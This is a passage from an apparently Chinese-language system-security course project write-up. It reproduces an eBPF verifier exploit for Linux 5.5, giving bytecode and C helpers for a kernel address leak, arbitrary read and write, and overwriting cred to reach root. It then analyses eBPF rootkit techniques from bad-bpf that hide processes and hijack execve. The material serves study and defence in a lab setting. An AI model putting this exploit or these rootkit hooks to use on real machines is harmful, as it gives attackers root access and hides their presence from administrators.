map_push_elem(struct bpf_map *map, void *value, u64 flags)\n    \uff08\u5b9e\u9645\u4e0a\u52ab\u6301\u540e\u662f map_get_next_key\uff09\n-&gt; array_map_get_next_key(struct bpf_map *map, void *key, void *next_key) \n</code></pre> <p>\u6240\u4ee5\u5bf9\u5e94\u8d77\u6765\uff0c\u6211\u4eec\u4f20\u5165\u7684 value \u5c31\u662f\u6700\u540e\u7684 key\uff0cflags \u5c31\u662f\u6700\u540e\u7684 next_key\uff0c\u6240\u4ee5\u6211\u4eec\u6784\u9020 value \u548c flags \u5c31\u53ef\u4ee5\u5b9e\u73b0 <code>*(u32*)flags = *(u32*)value + 1</code> \u7684\u5199\u5165\uff0c\u800c\u8fd9\u4e9b\u90fd\u662f\u6211\u4eec\u53ef\u63a7\u7684\u7528\u6237\u8f93\u5165\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u3002</p>"},{"location":"sec/syssec/project/#exp","title":"exp \u7a0b\u5e8f\u5206\u6790","text":"<p>\u9996\u5148\u9700\u8981\u521b\u5efa\u4e00\u4e9b map \u5e76\u52a0\u8f7d eBPF \u7a0b\u5e8f\uff1a</p> <pre><code>static void prep(void) {\n    ctrl_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x100, 1, 0);\n    exp_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x2000, 1, 0);\n    progfd = load_my_prog();\n    ...\n    if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){\n        __exit(strerror(errno));\n    }\n    if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0){\n        __exit(strerror(errno));\n    }\n}\n\nstatic int load_my_prog() {\n    struct bpf_insn my_prog[] = {\n        ... // eBPF \u7a0b\u5e8f\u5b57\u8282\u7801\n    };\n    return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, my_prog, sizeof(my_prog), \"GPL\", 0);\n}\n</code></pre> <p>\u521b\u5efa\u7684 ctrl_map \u7528\u4e8e\u4f5c\u4e3a\u5bf9\u7a0b\u5e8f\u7684\u4f20\u53c2\uff0cexp_map \u7528\u4e8e\u5b9e\u9645\u5229\u7528\u3002\u5728\u52a0\u8f7d\u7a0b\u5e8f\u540e\uff0c\u901a\u8fc7 socketpair \u521b\u5efa socket\uff0c\u901a\u8fc7 setsockopt \u5c06 eBPF \u7a0b\u5e8f\u52a0\u8f7d\u5230 socket \u4e0a\uff0c\u8fd9\u6837\u540e\u7eed\u5c31\u53ef\u4ee5\u901a\u8fc7\u5bf9 socket[0] \u7684 write \u89e6\u53d1 eBPF \u7a0b\u5e8f\u8fd0\u884c\uff1a</p> <pre><code>static void execute(void) {\n    char buffer[64];\n    ssize_t n = write(sockets[0], buffer, sizeof(buffer));\n    ...\n}\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u5206\u6790 eBPF \u7a0b\u5e8f\uff1a</p> <pre><code>// Part 1 (trigger vulnerability)\nBPF_LD_MAP_FD(BPF_REG_9,ctrl_mapfd),            // r9 = ctrl_mapfd\nBPF_MAP_GET(0,BPF_REG_8),                       // r8 = ctrl_buf[0] (0x?000..00110)\nBPF_MOV64_REG(BPF_REG_6, BPF_REG_0),            // r6 = r0             \n\nBPF_LD_IMM64(BPF_REG_2,0x4000000000),           // r2 = 0x4000000000\nBPF_LD_IMM64(BPF_REG_3,0x2000000000),           // r3 = 0x2000000000\nBPF_LD_IMM64(BPF_REG_4,0xFFFFffff),             // r4 = 0xFFFFffff\nBPF_LD_IMM64(BPF_REG_5,0x1),                    // r5 = 0x1\n\nBPF_JMP_REG(BPF_JGT,BPF_REG_8,BPF_REG_2,5),     // if r8 &gt; 0x4000000000 goto +5 (exit(0))\nBPF_JMP_REG(BPF_JLT,BPF_REG_8,BPF_REG_3,4),     // if r8 &lt; 0x2000000000 goto +4 (exit(0))\nBPF_JMP32_REG(BPF_JGT,BPF_REG_8,BPF_REG_4,3),   // if w8 &gt; 0xFFFFffff goto +3 (exit(0))\nBPF_JMP32_REG(BPF_JLT,BPF_REG_8,BPF_REG_5,2),   // if w8 &lt; 0x1 goto +2 (exit(0))\n\nBPF_ALU64_REG(BPF_AND,BPF_REG_8,BPF_REG_4),     // r8 = r8 &amp; 0xFFFFffff (0x110\uff0c\u4f46 verifier \u5df2\u7ecf\u8ba4\u4e3a\u5176\u5c31\u662f 0)\nBPF_JMP_IMM(BPF_JA, 0, 0, 2),                   // goto +2 (Part 2)\n\nBPF_MOV64_IMM(BPF_REG_0,0x0),                   // r0 = 0\nBPF_EXIT_INSN(),                                // exit(0) (r8 \u4e0d\u6ee1\u8db3\u6761\u4ef6)\n</code></pre> <p>Part 1 \u7528\u4e8e\u5904\u7406\u8f93\u5165\u53c2\u6570\u5e76\u89e6\u53d1\u6f0f\u6d1e\u3002\u9996\u5148\u8bfb\u53d6 ctrl_map \u7684\u7b2c\u4e00\u4e2a 64 \u4f4d\u503c\u4f5c\u4e3a r8\uff0c\u7136\u540e r6 = r0 \u662f\u53c2\u6570\u5730\u5740\uff0c\u4e5f\u5c31\u662f ctrl_buf \u7684\u5b9e\u9645\u5b58\u50a8\u7a7a\u95f4\uff0c\u7528\u6765\u5411\u653b\u51fb\u7528\u6237\u4f20\u56de\u7ed3\u679c\u3002\u63a5\u4e0b\u6765\u51e0\u4e2a JMP \u8bbe\u7f6e\u4e86 r8 \u7684 u{min,max}_value\uff0c\u5e76\u89e6\u53d1\u4e86\u6f0f\u6d1e\uff0c\u8fd9\u6837\u5728\u548c 0xffffffff \u53d6\u6216\u4e4b\u540e r8 \u5c31\u53d8\u6210\u4e86 verifier \u5b8c\u5168\u786e\u5b9a\u7684 0\uff0c\u4f46\u5176\u503c\u5b9e\u9645\u4e0a\u662f\u6211\u4eec\u4f20\u5165\u7684 ctrl_buf \u7684\u9996\u4e2a 64 \u4f4d\u503c\u7684\u4f4e 32 \u4f4d\uff0c\u6211\u4eec\u8bbe\u7f6e\u5176\u4f4e 32 \u4e3a 0x110\uff0c\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u8fdb\u5165\u5230 Part 2 \u4e2d\u6cc4\u6f0f\u5185\u6838\u5730\u5740\u3002</p> <pre><code>// Part 2 (leak info)\nBPF_LD_MAP_FD(BPF_REG_9,exp_mapfd),             // r9 = exp_mapfd\nBPF_MAP_GET_ADDR(0,BPF_REG_7),                  // r7 = &amp;exp_buf[0]\nBPF_ALU64_REG(BPF_SUB,BPF_REG_7,BPF_REG_8),     // r7 = r7 - r8 = &amp;exp_buf[0] - 0x110\n\nBPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0),      // r0 = *(u64 *)(r7)\nBPF_STX_MEM(BPF_DW,BPF_REG_6,BPF_REG_0,0x10),   // *(u64 *)(r6 + 0x10) = r0\n\nBPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0xc0),   // r0 = *(u64 *)(r7 + 0xc0)\nBPF_ALU64_IMM(BPF_ADD,BPF_REG_0,0x50),          // r0 = r0 + 0x110 - 0xc0 = &amp;exp_buf\n</code></pre> <p>Part 2 \u4e2d\u9996\u5148\u53d6\u51fa exp_map \u7684\u5730\u5740\uff0c\u7136\u540e\u51cf\u53bb r8\uff0c\u8fd9\u65f6 verifer \u8ba4\u4e3a\u5176\u51cf\u4e86 0 \u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u5b9e\u9645\u4e0a\u5df2\u7ecf\u51cf\u4e86 0x110 \u5230\u4e86 bpf_map \u7684\u9996\u5730\u5740\uff0c\u63a5\u4e0b\u6765\u53d6\u51fa\u9996\u5730\u5740\u7684\u503c\u5b58\u56de ctrl_buf+0x10 \u5373 <code>ctrl_buf[2]</code>\uff0c\u5c31\u53ef\u4ee5\u5728\u7528\u6237\u6001\u8bfb\u53d6\uff0c\u6cc4\u9732\u51fa\u5185\u6838\u5730\u5740\uff1a</p> <pre><code>static void leak_info(uint64_t *buffer, int mapfd) {\n    uint64_t key = 0;\n    if (bpf_lookup_elem(&amp;key, buffer, mapfd)) {\n        __exit(strerror(errno));\n    }\n}\n\nstatic void pwn(void) {\n    ...\n    execute_with_op(0);\n    leak_info(ctrl_buf, ctrl_mapfd);\n    uint64_t map_leak = ctrl_buf[2];\n    printf(\"[+] leak array_map_ops:\\t\\t0x%lx\\n\", map_leak);\n    kernel_base = map_leak - 0x1016480;\n    printf(\"[+] leak kernel_base addr:\\t0x%lx\\n\", kernel_base);\n    ...\n}\n\nstatic void execute_with_op(uint32_t op) {\n    ctrl_buf[0] = 0x2000000000 + 0x110;\n    ctrl_buf[1] = op;\n    bpf_update_elem(0, ctrl_buf, ctrl_mapfd, 0);\n    bpf_update_elem(0, exp_buf, exp_mapfd, 0);\n    execute();\n}\n</code></pre> <p>\u5728 Part 2 \u7684\u672b\u5c3e\u6211\u4eec\u8fd8\u9700\u8981\u5f97\u5230 exp_buf \u7684\u5730\u5740\u7528\u4e8e\u540e\u7eed Part 4 \u7684 map_ops \u8986\u76d6\uff0c\u5728 <code>bpf_map</code> \u7684 0xc0 \u504f\u79fb\u5904\uff0c\u6709\u4e00\u4e2a wait_list \u94fe\u8868\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u503c\u5c31\u662f\u4e00\u4e2a\u6307\u5411\u81ea\u8eab\u7684\u6307\u9488\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6\u8fd9\u4e2a\u503c\u6765\u5f97\u5230 exp_buf \u7684\u5730\u5740\uff1a</p> <pre><code>BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0xc0),   // r0 = *(u64 *)(r7 + 0xc0)\nBPF_ALU64_IMM(BPF_ADD,BPF_REG_0,0x50),          // r0 = r0 + 0x110 - 0xc0 = &amp;exp_buf\n</code></pre> <p>\u8fd9\u91cc\u4e0d\u76f4\u63a5\u4ece\u6700\u5f00\u59cb\u7684 r7 \u5f97\u5230\u5730\u5740\u662f\u56e0\u4e3a r7 \u7684\u7c7b\u578b\u662f\u6307\u9488\uff0cverifier \u4e0d\u5141\u8bb8\u5199\u5165\u6307\u9488\uff0c\u800c\u7ecf\u8fc7\u5982\u6b64\u64cd\u4f5c\u8bfb\u53d6\u51fa\u6765\u7684\u662f\u6807\u91cf\u503c\uff0c\u53ef\u4ee5\u540e\u7eed\u5199\u5165\u5230 map_ops \u4e2d\u3002</p> <p>\u63a5\u4e0b\u6765 eBPF \u7684 Part 3 \u7528\u4e8e\u8fdb\u884c\u4efb\u610f\u5730\u5740\u8bfb\uff1a</p> <pre><code>// Part 3 (arbitrary read)\nBPF_LDX_MEM(BPF_DW,BPF_REG_8,BPF_REG_6,0x8),    // r8 = *(u64 *)(r6 + 0x8) = op\nBPF_JMP_IMM(BPF_JNE, BPF_REG_8, 1, 4),          // if r8 != 1 goto +4\nBPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_6,0x20),   // r0 = *(u64 *)(r6 + 0x20) = addr\nBPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_0,0x40),   // *(u64 *)(r7 + 0x40) = r0 (bpf_map-&gt;btf = addr-0x58)\nBPF_MOV64_IMM(BPF_REG_0,0x0),                   // exit(0)\nBPF_EXIT_INSN(),\n</code></pre> <p>\u5148\u8bfb\u53d6 <code>ctrl_buf[1]</code> \u4f5c\u4e3a\u53c2\u6570 op\uff0c\u5982\u679c\u662f 1 \u8868\u793a\u8bfb\u30012 \u8868\u793a\u5199\u30010 \u8868\u793a\u4e0d\u8bfb\u4e5f\u4e0d\u5199\uff08\u6bd4\u5982\u6cc4\u6f0f\u5730\u5740\u7684\u65f6\u5019\u6267\u884c\u7684\u5c31\u662f <code>update_elem(0)</code> \u8bbe\u7f6e op \u4e3a 0 \u4e0d\u8bfb\u4e5f\u4e0d\u5199\uff09\u3002\u7136\u540e\u5982\u679c op \u662f 1\uff0c\u5c31\u4f1a\u6267\u884c\u4e0b\u9762\u7684\u4ee3\u7801\u3002</p> <p>\u63a5\u4e0b\u6765\u8bfb\u53d6\u4e86 r6+0x20\uff0c\u4e5f\u5c31\u662f <code>ctrl_buf[4]</code>\uff0c\u6211\u4eec\u4ee4\u8fd9\u4e2a\u53c2\u6570\u4e3a target-0x58\uff0c\u7136\u540e\u5b58\u5165 r0 \u5bc4\u5b58\u5668\u4e2d\uff0c\u63a5\u4e0b\u6765\u5b58\u5165 r7+0x40\uff0cr7 \u662f bpf_map \u7684\u5f00\u5934\uff0c\u6240\u4ee5 0x40 \u504f\u79fb\u5904\u5c31\u662f btf \u6307\u9488\u7684\u4f4d\u7f6e\u3002\u63a5\u4e0b\u6765\u901a\u8fc7\u8c03\u7528 <code>bpf_map_get_info_by_fd</code> \u5c31\u53ef\u4ee5\u89e6\u53d1\u4efb\u610f\u5730\u5740\u8bfb\uff0c\u8bfb\u53d6\u51fa target \u5904 32 \u4f4d\u7684\u503c\uff1a</p> <pre><code>static uint32_t arbitrary_read32(uint64_t addr) {\n    uint32_t read_info;\n\n    ctrl_buf[0] = 0x2000000000 + 0x110;\n    ctrl_buf[1] = 1;\n    ctrl_buf[4] = addr - 0x58;\n\n    bpf_update_elem(0, ctrl_buf, ctrl_mapfd, 0);\n    bpf_update_elem(0, exp_buf, exp_mapfd, 0);\n    execute();\n\n    read_info = bpf_map_get_info_by_fd(0, exp_buf, exp_mapfd, info);\n    return read_info;\n}\n\nstatic uint64_t arbitrary_read(uint64_t addr) {\n    uint32_t addr_low = arbitrary_read32(addr);\n    uint32_t addr_high = arbitrary_read32(addr + 0x4);\n    return ((uint64_t)addr_high &lt;&lt; 32) | addr_low;\n}\n\nstatic uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info) {\n    union bpf_attr attr = {\n        .map_fd = mapfd,\n        .key = (__u64)&amp;key,\n        .value = (__u64)value,\n        .info.bpf_fd = mapfd,\n        .info.info_len = 0x100,\n        .info.info = (__u64)info,\n    };\n    syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD, &amp;attr, sizeof(attr));\n    return *(uint32_t *)((char *)info + 0x40);\n}\n</code></pre> <p>\u63a5\u4e0b\u6765 Part 4 \u7528\u4e8e\u4efb\u610f\u5730\u5740\u5199\u524d\u7684\u51c6\u5907\uff1a</p> <pre><code>// Part 4 (prepare for arbitrary write)\nBPF_JMP_IMM(BPF_JNE, BPF_REG_8, 2, 4),          // if r8 != 2 goto +4 (exit(0))\nBPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_0,0),      // *(u64 *)(r7) = r0\nBPF_ST_MEM(BPF_W,BPF_REG_7,0x18,BPF_MAP_TYPE_STACK),    // *(u32 *)(r7 + 0x18) = BPF_MAP_TYPE_STACK\nBPF_ST_MEM(BPF_W,BPF_REG_7,0x24,-1),                    // *(u32 *)(r7 + 0x24) = -1 max_entries\nBPF_ST_MEM(BPF_W,BPF_REG_7,0x2c,0x0),                   // *(u32 *)(r7 + 0x2c) = 0 lock_off\n\nBPF_MOV64_IMM(BPF_REG_0,0x0),                   // exit(0)\nBPF_EXIT_INSN(),\n</code></pre> <p>\u8fd9\u91cc\u5c06 Part 2 \u91cc\u7b97\u51fa\u6765\u7684 exp_buf \u5730\u5740\u5199\u5230 <code>bpf_map</code> \u5f00\u5934\uff0c\u4e5f\u5c31\u662f map_ops \u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u6570\u7ec4\u5c06\u5176\u5185\u5bb9\u4fee\u6539\u4e3a\u6211\u4eec\u52ab\u6301\u540e\u7684\u51fd\u6570\u8868\uff0c\u4fee\u6539\u5176\u4e2d <code>map_push_elem</code> \u4e3a <code>map_get_next_key</code>\uff0c\u518d\u628a\u5185\u5bb9\u590d\u5236\u5230 map \u4e2d\uff0c\u4f5c\u4e3a r0 \u53c2\u6570\u4f20\u9012\u8fdb\u6765\u3002\u7136\u540e\u4fee\u6539 <code>bpf_map</code> \u7684 <code>map_type</code>\u3001<code>max_entries</code>\u3001<code>spin_lock_off</code> \u5373\u53ef\u3002\u63a5\u4e0b\u6765\u901a\u8fc7\u8c03\u7528 <code>bpf_update_elem</code> \u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\uff1a</p> <pre><code>static int bpf_update_elem(uint64_t key, void *value, int mapfd, uint64_t flags) {\n    union bpf_attr attr = {\n        .map_fd = mapfd,\n        .key = (__u64)&amp;key,\n        .value = (__u64)value,\n        .flags = flags,\n    };\n    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));\n}\n</code></pre> <p><code>bpf_update_elem(0, exp_buf, exp_mapfd, addr)</code> \u5c31\u53ef\u4ee5\u5b9e\u73b0 <code>*(u32 *)addr = exp_buf[0] + 1</code> \u7684\u4efb\u610f\u5730\u5740\u5199\u3002</p>"},{"location":"sec/syssec/project/#_4","title":"\u5229\u7528\u7ed3\u679c","text":"<p>\u5229\u7528\u4efb\u610f\u5730\u5740\u8bfb\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u5230\u5185\u6838\u4e2d\u7684 <code>per_cpu_offset</code>\uff0c\u7136\u540e\u6839\u636e\u5176\u504f\u79fb 0x17d00 \u5f97\u5230 <code>current_task</code> \u5730\u5740\uff0c\u518d\u504f\u79fb 0x648 \u5f97\u5230\u5176\u4e2d <code>comm</code> \u5b57\u6bb5\uff0c\u5373\u5f53\u524d\u8fdb\u7a0b\u6267\u884c\u7684\u547d\u4ee4\uff0c\u6211\u4eec\u4ee4\u5176\u4e3a <code>0x353338385f707865</code> \u5373 <code>exp_8835</code>\uff0c\u6211\u4eec\u540e\u7eed\u4e5f\u9700\u8981\u5c06 exp \u7f16\u8bd1\u540e\u7684\u53ef\u6267\u884c\u6587\u4ef6\u547d\u540d\u4e3a\u6b64\u540d\u79f0\u3002\u67e5\u8be2\u5230\u5f53\u524d\u8fdb\u7a0b\u7684 task \u7ed3\u6784\u4f53\u540e\uff0c\u5c31\u53ef\u4ee5\u6839\u636e\u5176\u504f\u79fb 0x638 \u5f97\u5230 <code>cred</code> \u7ed3\u6784\u4f53\uff0c\u5373\u5f53\u524d\u8fdb\u7a0b\u7684\u6743\u9650\u4fe1\u606f\uff1a</p> <pre><code>uint64_t task_struct, cred, current_task, comm;\nuint64_t per_cpu_offset = arbitrary_read(0xffffffff822c26c0);\nprintf(\"[+] per_cpu_offset:\\t\\t0x%lx\\n\", per_cpu_offset);\nfor (int i = 0; ; i++) {\n    current_task = arbitrary_read(per_cpu_offset + 0x17d00);\n    comm = arbitrary_read(current_task + 0x648);\n    if (comm == 0x353338385f707865) {\n        printf(\"[+] current_task:\\t\\t0x%lx\\n\", current_task);\n        task_struct = current_task;\n        break;\n    }\n    hextostr(comm);\n}\nhextostr(comm);\n\ncred = arbitrary_read(task_struct + 0x638);\nprintf(\"[+] cred:\\t0x%lx\\n\", cred);\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u8981\u5229\u7528\u4efb\u610f\u5730\u5740\u5199\u6765\u8986\u76d6 cred \u7ed3\u6784\u4f53\uff0c\u5148\u521b\u5efa\u4e00\u4e2a\u5199\u6ee1\u4e86 map_get_next_key \u51fd\u6570\u6307\u9488\u7684\u6570\u7ec4\uff0c\u7136\u540e\u5c06\u5176\u8986\u76d6\u5230 map_ops \u4e2d\uff0c\u518d\u5c06 map \u7c7b\u578b\u6539\u4e3a stack \u7c7b\u578b\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 map_push_elem \u6765\u8c03\u7528 map_get_next_key\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\uff1a</p> <pre><code>uint64_t fake_map_ops[] = {\n    kernel_base + 0x16cfa0,\n    ...\n    kernel_base + 0x16cfa0,\n};\nmemcpy(exp_buf, fake_map_ops, sizeof(fake_map_ops));\nexecute_with_op(2);\nexp_buf[0] = 0x0-1;\nfor (int i = 0; i &lt; 8; i++) {\n    bpf_update_elem(0, exp_buf, exp_mapfd, cred + 4 + i * 4);\n}\n</code></pre> <p>\u8986\u76d6\u4e86 cred \u6743\u9650\u4e3a 0 \u540e\u5373\u53ef\u5b9e\u73b0\u63d0\u6743\u3002\u6211\u4eec\u57fa\u4e8e Linux-5.5 \u7684\u5185\u6838\uff0c\u51c6\u5907\u4e86\u4e00\u4e2a\u5efa\u8bae rootfs \u6587\u4ef6\u7cfb\u7edf\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u6211\u4eec\u7f16\u8bd1\u597d\u7684 exp \u4ee3\u7801\uff0c\u7136\u540e\u901a\u8fc7 qemu \u542f\u52a8\u5185\u6838\uff0c\u6267\u884c exp\uff0c\u5b9e\u73b0\u63d0\u6743\uff1a</p>"},{"location":"sec/syssec/project/#ebpf-rootkit","title":"eBPF rootkit \u5b89\u5168\u5a01\u80c1\u5206\u6790","text":""},{"location":"sec/syssec/project/#ebpf-rootkit_1","title":"eBPF rootkit \u539f\u7406","text":"<p>rootkit \u662f\u4e00\u79cd\u6076\u610f\u8f6f\u4ef6\uff0c\u662f\u5355\u8bcd root \u548c kit \u7684\u7ec4\u5408\u3002root \u662f\u5177\u6709\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u5458\u8eab\u4efd\u7684\u7528\u6237\u5e10\u6237\u3002\u540c\u65f6\uff0ckit \u662f\u6307\u4e00\u5957\u8f6f\u4ef6\u5de5\u5177\u3002\u56e0\u6b64\uff0crootkit \u662f\u4e00\u7ec4\u5de5\u5177\uff0c\u53ef\u4ee5\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u7cfb\u7edf\u4e2d\u7684\u6700\u9ad8\u6743\u9650\u3002 </p> <p>rootkit \u7279\u522b\u5371\u9669\uff0c\u56e0\u4e3a\u5b83\u4eec\u65e8\u5728\u9690\u85cf\u5b83\u4eec\u5728\u8bbe\u5907\u4e0a\u7684\u5b58\u5728\u3002\u5982\u679c\u5c06 rootkit \u5b89\u88c5\u5230\u673a\u5668\u4e0a\uff08\u901a\u5e38\u901a\u8fc7\u7f51\u7edc\u9493\u9c7c\uff09\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8fdc\u7a0b\u8bbf\u95ee\u548c\u63a7\u5236\u53d7\u5bb3\u673a\u5668\u3002\u56e0\u4e3a\u5b83\u4eec\u6709 root \u6743\u9650\uff0crootkit \u53ef\u7528\u4e8e\u6267\u884c\u8bf8\u5982\u505c\u7528\u9632\u75c5\u6bd2\u8f6f\u4ef6\u3001\u76d1\u89c6\u6d3b\u52a8\u3001\u7a83\u53d6\u654f\u611f\u6570\u636e\u6216\u5728\u8bbe\u5907\u4e0a\u6267\u884c\u5176\u4ed6\u6076\u610f\u8f6f\u4ef6\u7b49\u9ad8\u6743\u9650\u64cd\u4f5c\u3002</p> <p>\u800c eBPF \u5c31\u975e\u5e38\u9002\u5408\u4e8e\u5236\u4f5c rootkit \u7a0b\u5e8f\uff0c\u8ba9\u6211\u4eec\u56de\u987e eBPF \u6280\u672f\u7684\u7279\u6027\uff1a</p> <ul> <li>eBPF \u6280\u672f\u5141\u8bb8\u5728\u7528\u6237\u6001\u7f16\u5199\u4ee3\u7801\uff0c\u88ab verifier \u626b\u63cf\u9274\u5b9a\u65e0\u95ee\u9898\u540e\uff0c\u9001\u5165\u5185\u6838\u6267\u884c\uff1b</li> <li>eBPF \u6280\u672f\u80fd\u591f\u5728\u4e0d\u4fee\u6539\u5185\u6838\u4ee3\u7801\u7684\u524d\u63d0\u4e0b\uff0c\u67e5\u770b\u5185\u6838\u6570\u636e\u6216\u4fee\u6539\u5185\u6838\u529f\u80fd\uff1b</li> <li>eBPF \u53ef\u4ee5\u5728 Linux \u7cfb\u7edf\u7684\u5404\u4e2a\u5730\u65b9\u63d2\u6869\uff0c\u5728\u6267\u884c\u5230\u6307\u5b9a\u4f4d\u7f6e\u65f6\uff0c\u6267\u884c\u7528\u6237\u81ea\u5b9a\u7684\u4ee3\u7801\uff0c\u5b9e\u73b0\u6570\u636e\u7684\u641c\u96c6\u548c\u4fee\u6539\uff1b</li> <li>\u56e0\u6b64\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5c06 eBPF rootkit \u52a0\u8f7d\u5230\u5185\u6838\u4e2d\u6765 hook \u7cfb\u7edf\u51fd\u6570\u62e6\u622a\u548c\u4fee\u6539\u4ed6\u4eec\u7684\u884c\u4e3a\uff0c\u5b9e\u73b0\u7be1\u6539\u5185\u6838\u6570\u636e\u7ed3\u6784\u3001\u9690\u85cf\u8fdb\u7a0b\u3001\u6587\u4ef6\u6216\u7f51\u7edc\u8fde\u63a5\u7b49\u76ee\u7684\u3002</li> </ul> <p>\u6b64\u5916\uff0c\u7531\u4e8e eBPF rootkit \u8fd0\u884c\u5728\u5185\u6838\u6001\uff0c\u4f20\u7edf\u7684\u7528\u6237\u6001\u9632\u62a4\u63aa\u65bd\u5f88\u96be\u68c0\u6d4b\u5230\u5b83\u7684\u5b58\u5728\u3002\u540c\u65f6\uff0ceBPF rootkit \u53ef\u4ee5\u52a8\u6001\u52a0\u8f7d\u548c\u5378\u8f7d\uff0c\u6027\u80fd\u5f00\u9500\u5c0f\uff0c\u4e0d\u9700\u8981\u4fee\u6539\u5185\u6838\u4ee3\u7801\u6216\u6587\u4ef6\u7cfb\u7edf\uff0c\u589e\u52a0\u4e86\u68c0\u6d4b\u548c\u9632\u5fa1\u7684\u96be\u5ea6\u3002</p>"},{"location":"sec/syssec/project/#bad-bpf","title":"bad-bpf \u7a0b\u5e8f\u590d\u73b0","text":"<p>bad-bpf \u662f PatH \u5b9e\u73b0\u7684\u4e00\u4e2a eBPF rootkit\uff0c\u5e76\u5728 DEFCON '29 \u4e0a\u8fdb\u884c\u4e86\u9898\u4e3a Warping Reality: Creating and Countering the Next Generation of Linux Rootkits \u7684\u5c55\u793a\u6f14\u8bb2\u3002\u5176\u5b9e\u73b0\u4e86\u9690\u85cf\u8fdb\u7a0b\u3001\u52ab\u6301\u65b0\u5efa\u8fdb\u7a0b\u3001\u7528\u6237\u63d0\u6743\u7b49\u591a\u79cd\u529f\u80fd\u3002</p>"},{"location":"sec/syssec/project/#_5","title":"\u9690\u85cf\u8fdb\u7a0b","text":"<p>pidhide \u7a0b\u5e8f\u901a\u8fc7 hook getdents64 \u7cfb\u7edf\u8c03\u7528\u6765\u53d6\u6d88\u4e0e PID \u76f8\u5173\u8054\u7684 /proc/ \u6587\u4ef6\u5939\u7684\u94fe\u63a5\uff0c\u4f7f ps \u65e0\u6cd5\u67e5\u627e\u5230 /proc/ \u6587\u4ef6\u5939\u4e2d\u7684\u8fdb\u7a0b\u4fe1\u606f\u3002</p> <pre><code>SEC(\"tp/syscalls/sys_exit_getdents64\")\nint handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {\n    \u00b7\u00b7\u00b7\n    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;\n    long ret = bpf_probe_write_user(&amp;dirp_previous-&gt;d_reclen, &amp;d_reclen_new, sizeof(d_reclen_new));\n    \u00b7\u00b7\u00b7\n}\n</code></pre> <p>\u5c06 linux_dirent64 \u7ed3\u6784\u4f53\u7684 d_reclen \u5b57\u6bb5\u4fee\u6539\u4e3a d_reclen_previous + d_reclen\uff0c\u4f7f\u5f97\u8bfb\u53d6\u76ee\u5f55\u65f6\u8df3\u8fc7\u9690\u85cf\u7684\u8fdb\u7a0b\u76ee\u5f55\u3002</p> <p>\u6211\u4eec\u901a\u8fc7 docker \u8fd0\u884c\u4e00\u4e2a /bin/bash \u8fdb\u7a0b\uff0c\u53ef\u4ee5\u901a\u8fc7 ps \u770b\u5230\u8fd9\u4e2a\u8fdb\u7a0b\uff1a</p> <p>\u7136\u540e\u8fd0\u884c pidhide \u7a0b\u5e8f\uff0c\u52a0\u8f7d\u6076\u610f\u7684 eBPF \u7a0b\u5e8f\uff0c\u4f7f\u5f97\u8fd9\u4e2a\u8fdb\u7a0b\u88ab\u9690\u85cf\uff0c\u901a\u8fc7 ps \u65e0\u6cd5\u67e5\u770b\u5230\uff1a</p>"},{"location":"sec/syssec/project/#_6","title":"\u52ab\u6301\u65b0\u5efa\u8fdb\u7a0b","text":"<p>exechijack \u7a0b\u5e8f\u4f1a\u52ab\u6301\u6240\u6709\u7528\u4e8e\u521b\u5efa\u65b0\u8fdb\u7a0b\u7684 execve \u7cfb\u7edf\u8c03\u7528\uff0c\u8f6c\u800c\u8c03\u7528 /a\uff0c\u5373\u53ea\u8f93\u51fa uid \u548c argv[0]\uff1a</p> <pre><code>SEC(\"tp/syscalls/sys_enter_execve\")\nint handle_execve_enter(struct trace_event_raw_sys_enter *ctx) {\n    \u00b7\u00b7\u00b7\n    // \u8bfb\u53d6\u5f53\u524d execve \u7cfb\u7edf\u8c03\u7528\u65b0\u5efa\u7684\u8fdb\u7a0b\u4fe1\u606f\n    bpf_probe_read_user(&amp;prog_name, TASK_COMM_LEN, (void*)ctx-&gt;args[0]);\n    bpf_probe_read_user(&amp;prog_name_orig, TASK_COMM_LEN, (void*)ctx-&gt;args[0]);\n\n    // \u4fee\u6539\u7a0b\u5e8f\u8def\u5f84\u4e3a /a\n    prog_name[0] = '/';\n    prog_name[1] = 'a';\n    for (int i = 2; i &lt; TASK_COMM_LEN ; i++) {\n        prog_name[i] = '\\x00';\n    }\n    long ret = bpf_probe_write_user((void*)ctx-&gt;args[0], &amp;prog_name, 3);\n    